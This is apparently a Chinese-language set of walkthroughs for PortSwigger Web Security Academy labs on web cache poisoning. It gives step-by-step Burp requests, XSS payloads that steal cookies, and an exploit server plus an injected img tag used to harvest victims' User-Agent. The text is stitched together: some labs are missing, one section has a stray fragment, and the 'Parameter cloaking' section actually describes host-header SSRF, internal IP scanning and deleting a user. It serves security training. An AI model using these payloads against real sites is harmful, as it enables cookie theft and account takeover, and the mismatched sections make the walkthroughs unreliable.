一、Web cache poisoning

Web缓存投毒

01 Web cache poisoning with an unkeyed header

描述

该实验室很容易受到Web 缓存中毒的影响，因为它以不安全的方式处理来自未加密标头的输入。用户大约每分钟访问一次主页。要解决此实验室问题，请使用alert(document.cookie)在访问者浏览器中执行的响应来毒化缓存。

解决方案

1.在 Burp 运行的情况下，加载网站的主页。将主页请求发送到repeater，添加缓存破坏器查询参数/?a=1 添加X-Forwarded-Host: aaa.com 发送请求 2.X-Forwarded-Host标头已被用于动态生成绝对 URL 以导入存储在/resources/js/tracking.js. 重放请求并观察响应已经包含标头X-Cache: hit。这告诉我们响应来自缓存。

3.转到漏洞利用服务器并更改文件名以匹配易受攻击的响应使用的路径： /resources/js/tracking.js 在正文中，输入有效载荷alert(document.cookie)并存储漏洞利用。 4.在 Burp Repeater 中 打开对主页的请求并移除缓存破坏器查询参数。 添加以下标头，记住输入您自己的漏洞利用服务器 ID： X-Forwarded-Host: your-exploit-server-id.web-security-academy.net 发送您的恶意请求。继续重放请求，直到您看到您的漏洞利用服务器 URL 反映在响应和X-Cache: hit标头中。

5.要模拟受害者，请在浏览器中加载中毒的 URL 并确保alert()触发。请注意，您必须在缓存过期之前执行此测试。此实验室中的缓存每 30 秒过期一次。 6.如果实验室仍未解决，则受害者未在缓存中毒时访问该页面。每隔几秒继续发送请求以重新毒害缓存，直到受害者受到影响并且实验室得到解决。

02 Web cache poisoning with an unkeyed cookie

描述

此实验室易受web缓存中毒的影响，因为缓存密钥中不包含cookie。用户大约每分钟访问一次主页。要解决此问题，请使用在访问者浏览器中执行alert(1)的响应毒害缓存。

2.在 Burp 中，转到“proxy”>“HTTP history”并研究您生成的请求和响应。请注意，您收到的第一个响应设置了 cookie fehost=prod-cache-01。

3.重新加载主页并观察fehostcookie中的值反映在响应中的双引号 JavaScript 对象中。

4.将此请求发送到 Burp Repeater 并添加一个 cache-buster 查询参数。 将 cookie 的值更改为任意字符串并重新发送请求。确认此字符串反映在响应中。

5.bp抓包，刷新首页，抓到包后在cookie 中修改fehost以弹xss，例如： fehost=someString"-alert(1)-"someString

03 Web cache poisoning with multiple headers

描述

该实验室包含一个Web 缓存中毒漏洞，只有在您使用多个标头来制作恶意请求时才能利用该漏洞。用户大约每分钟访问一次主页。要解决此实验室问题，请使用alert(document.cookie)在访问者浏览器中执行的响应来毒化缓存。

本实验同时支持X-Forwarded-Host和X-Forwarded-Scheme标头。

解决方案

1.在 Burp 运行的情况下，加载网站的主页。

2.转到“proxy”>“HTTP history”并研究您生成的请求和响应。找到对GET JavaScript 文件的请求/resources/js/tracking.js并将其发送到 Burp Repeater。

3.添加一个 cache-buster 查询参数和X-Forwarded-Host带有任意主机名的标头，例如example.com. 请注意，这似乎对响应没有任何影响。

4.删除X-Forwarded-Host标头，改为添加X-Forwarded-Scheme: nothttps标头。请注意，如果包含HTTPS以外的任何值，则会收到302响应。Location标头显示您正被重定向到您请求的同一URL，但使用的是https://。

5.将X-Forwarded-Host: example.com标头添加回请求，但也要保留X-Forwarded-Scheme: nothttps。发送此请求并注意Location302 重定向的标头现在指向https://example.com/。

6.转到漏洞利用服务器并更改文件名以匹配易受攻击的响应使用的路径： /resources/js/tracking.js 在正文中，输入有效载荷alert(document.cookie)并存储漏洞利用。

7.回到Burp Repeater中的请求，设置X-Forwarded-Hostheader如下，记得输入自己的exploit server ID：

X-Forwarded-Host: your-exploit-server-id.web-security-academy.net

确保X-Forwarded-Scheme标题设置为nothttps.

8.发送请求，直到您在响应和X-Cache: hit标头中看到您的漏洞利用服务器 URL 。

9.要检查响应是否正确缓存，请在 Burp 中右键单击请求，选择“复制 URL”，然后在浏览器中加载此 URL。如果缓存成功中毒，您将看到包含有效负载的脚本alert(document.cookie)。请注意，alert()实际上不会在这里执行。

10回到 Burp Repeater，移除缓存破坏器，然后重新发送请求，直到再次使缓存中毒。 11.要模拟受害者，请在浏览器中重新加载主页并确保alert()触发。 继续重放请求以保持缓存中毒，直到受害者访问站点并且实验室得到解决。

04 Targeted web cache poisoning using an unknown header

描述

此实验室易受web缓存中毒的影响。用户大约每分钟访问一次主页。用户还可以查看您发布的任何评论。要解决此问题，您需要在访问者的浏览器中使用执行警报（document.cookie）的响应来毒害缓存。但是，您还需要确保响应服务于预期受害者所属的特定用户子集。

解决方案

解决这个实验需要多个步骤。首先，您需要确定漏洞所在并研究缓存的行为方式。然后，您需要找到一种方法来定位正确的用户子集，然后最终相应地毒化缓存。

1.在 Burp 运行的情况下，加载网站的主页。

2.在 Burp 中，转到“proxy”>“HTTP history并研究您生成的请求和响应。找到对GET主页的请求。

3.随着启用扩展param Miner，单击鼠标右键，选择“Guess headers”。一段时间后，Param Miner 会以X-Host header的形式报告有秘密输入。

4.将GET请求发送到 Burp Repeater 并添加一个 cache-buster 查询参数。

5.添加X-Host具有任意主机名的标头，例如example.com. 请注意，此标头的值用于动态生成绝对 URL 以导入存储在/resources/js/tracking.js.

6.转到漏洞利用服务器并更改文件名以匹配易受攻击的响应使用的路径：/resources/js/tracking.js. 在正文中，输入有效载荷alert(document.cookie)并存储漏洞利用。

7.回到Burp Repeater中的请求，设置X-Host header如下，记得添加自己的exploit server ID： X-Host: your-exploit-server-id.web-security-academy.net

8.发送请求，直到您在响应和X-Cache: hit标头中看到您的漏洞利用服务器 URL 。

9.要模拟受害者，请在浏览器中加载 URL 并确保alert()触发。 请注意，Vary标头用于指定User-Agent是缓存键的一部分。要针对受害者，您需要找出他们的User-Agent.

10.在网站上，请注意评论功能允许某些 HTML 标签。发布包含合适负载的评论，使受害者的浏览器与您的漏洞利用服务器进行交互，例如：

<img src="https://your-exploit-server-id.web-security-academy.net/foo" />

11.转到博客页面并仔细检查您的评论是否已成功发布。

12.转到漏洞利用服务器并单击按钮打开“access log”。每隔几秒刷新一次页面，直到您看到不同用户（ip不同）发出的请求。这是受害者。User-Agent从日志中复制它们。

13.回到 Burp Repeater 中的恶意请求，并将受害者的请求粘贴User-Agent到相应的标头中。删除缓存破坏者。

14.继续发送请求，直到您在响应和X-Cache: hit标头中看到您的漏洞利用服务器 URL

15.重播请求以保持缓存中毒，直到受害者访问站点并解决实验室问题

解决方案

本实验要求您同时使用多个恶意响应来毒化缓存，并将其与受害者的浏览行为相协调。

1.在 Burp 运行的情况下，加载网站的主页。 2.使用Param Miner确定支持X-Forwarded-Host和X-Original-URL标头。

07 Web cache poisoning via an unkeyed query string

描述

此实验室易受web缓存中毒的影响，因为查询字符串未被检测。用户定期使用Chrome访问该网站的主页。

要解决实验室问题，请在受害者浏览器中使用执行alert(1)的响应毒害主页。

hint：如果您遇到困难，可以使用Pragma:x-get-cache-key头在响应中显示缓存键。这也适用于其他一些实验室。

尽管不能将查询参数用作缓存buster，但有一个通用的请求头，如果存在，将对其进行键控。您可以使用Param Miner扩展自动向请求添加缓存buster头。

解决方案

1.在 Burp 运行的情况下，加载网站的主页。在 Burp 中，转到“proxy”>“HTTP history”。找到对GET主页的请求。请注意，此页面是一个潜在的缓存预言机。将请求发送到 Burp Repeater。

2.向请求添加任意查询参数。请注意，即使您更改了查询参数，您仍然可以获得缓存命中（X-Cache: hit）。这表明它们不包含在缓存键中。

3.请注意，您可以将Origin标头用作缓存破坏者。将其添加到您的请求中。

4.当您遇到缓存未命中时（X-Cache: miss），请注意您注入的参数会反映在响应中。如果对您的请求的响应被缓存，您可以删除查询参数，它们仍将反映在缓存的响应中。

5.添加一个从反射字符串中跳出并注入XSS负载的任意参数：

GET /?evil='/><script>alert(1)</script>

6.继续重放请求，直到您看到您的负载反映在响应和X-Cache: hit标头中。

7.要模拟受害者，请从您的请求中删除查询字符串并再次发送（同时使用相同的缓存破坏器）。检查您是否仍然收到包含有效负载的缓存响应。

8.删除 cache-busterOrigin标头并将您的有效负载添加回查询字符串。重播请求，直到您为普通用户毒化缓存。通过在浏览器中加载主页并观察弹出窗口，确认此攻击已成功。

9.当受害用户访问中毒主页时，实验室将被解决。如果实验室在 35 秒后仍未解决，您可能需要重新毒化缓存。

08 Web cache poisoning via an unkeyed query parameter

描述

此实验室易受web缓存中毒的影响，因为它从缓存密钥中排除了某个参数。用户定期使用Chrome访问该网站的主页。

要解决实验室问题，请使用在受害者浏览器中执行alert(1)的响应毒害缓存。

hint：网站通常从缓存密钥中排除某些UTM分析参数。

解决方案

1.观察主页是一个合适的缓存oracle。请注意，无论何时更改查询字符串，都会出现缓存未命中。这表明它是缓存键的一部分。另请注意，查询字符串反映在响应中。

2.添加缓存破坏者查询参数。

3.使用 Param Miner 的“Guess GET parameters”功能来确定utm_content应用程序支持该参数。

4.通过将其添加到查询字符串并检查您是否仍然获得缓存命中来确认此参数未键控。继续发送请求，直到出现缓存未命中。观察到这个无键参数也与查询字符串的其余部分一起反映在响应中。

5.发送一个带有utm_content超出反射字符串的参数并注入XSS负载的请求：

GET /?a=1&b=2&utm_content='/><script>alert(1)</script>

6.缓存负载后，删除utm_content参数，右键单击请求，然后选择“copy URL”。在浏览器中打开此 URL，并检查alert()加载页面时是否触发了 。

7.移除你的缓存破坏器，utm_content用你的有效负载重新添加参数，并重播请求，直到缓存对普通用户中毒。当受害用户访问中毒主页时，实验室将被解决。

09 Parameter cloaking

描述

此实验室易受web缓存中毒的影响，因为它从缓存密钥中排除了某个参数。缓存和后端之间的参数解析也不一致。用户定期使用Chrome访问该网站的主页。

要解决实验室问题，请使用参数掩蔽技术，通过在受害者浏览器中执行alert(1)的响应毒害缓存。

hint:该网站不包括某个UTM分析参数。

解决方案

2.请注意，您也可以通过在请求行中提供一个绝对URL来访问主页，如下所示：

GET https://your-lab-id.web-security-academy.net/

3.请注意，执行此操作时，修改主机头不再导致阻止请求。相反，您会收到一个超时错误。这表明正在验证绝对URL，而不是主机标头。

4.使用Burp Collaborator client确认您可以通过这种方式使网站的中间件向任意服务器发出请求。例如，以下请求将触发对协作服务器的HTTP请求：

GET https://your-lab-id.web-security-academy.net/
Host：your-collaborator-id.burpcollaborator.net

5.将包含绝对URL的请求发送给Burp入侵者。使用主机头扫描IP范围192.168.0.0/24，以识别管理接口的IP地址。将此请求发送到Burp Intruder进行遍历可用的地址。

6.在Burp Repeater中，将/admin附加到请求行中的绝对URL并发送请求。请注意，您现在可以访问管理面板，包括用于删除用户的表单。

7.将请求中的绝对URL更改为指向/admin/delete。从显示的响应中复制CSRF令牌，并将其作为查询参数添加到请求中。还添加一个包含carlos的用户名参数。请求行现在应该如下所示，但使用不同的CSRF令牌：

POST https://your-lab-id.web-security-academy.net/admin/delete
​
csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos

从显示的响应中的Set cookie标头复制会话cookie，并将其添加到您的请求中。

发送删除Carlos并解决实验室问题的请求。
